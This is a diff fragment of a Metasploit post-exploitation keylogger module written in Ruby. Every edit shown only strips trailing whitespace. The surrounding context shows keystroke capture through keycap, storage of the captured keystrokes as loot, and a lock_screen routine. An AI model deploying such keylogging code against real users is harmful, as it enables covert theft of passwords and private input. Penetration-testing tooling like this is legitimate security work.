@@ -57,7 +57,7 @@ class Metasploit3 < Msf::Post
 
 	# Run Method for when run command is issued
 	def run
-		
+
 		print_status("Executing module against #{sysinfo['Computer']}")
 		if datastore['MIGRATE']
 			case datastore['CAPTURE_TYPE']
@@ -75,7 +75,7 @@ class Metasploit3 < Msf::Post
 			end
 
 		end
-		
+
 		if startkeylogger
 			keycap(datastore['INTERVAL'],set_log)
 		end
@@ -83,7 +83,7 @@ class Metasploit3 < Msf::Post
 
 	# Returns the path name to the stored loot filename
 	def set_log
-		store_loot("host.windows.keystrokes", "text/plain", session, "Keystroke log started at #{Time.now.to_s}\n", "keystrokes.txt", "User Keystrokes")	
+		store_loot("host.windows.keystrokes", "text/plain", session, "Keystroke log started at #{Time.now.to_s}\n", "keystrokes.txt", "User Keystrokes")
 	end
 
 	def lock_screen
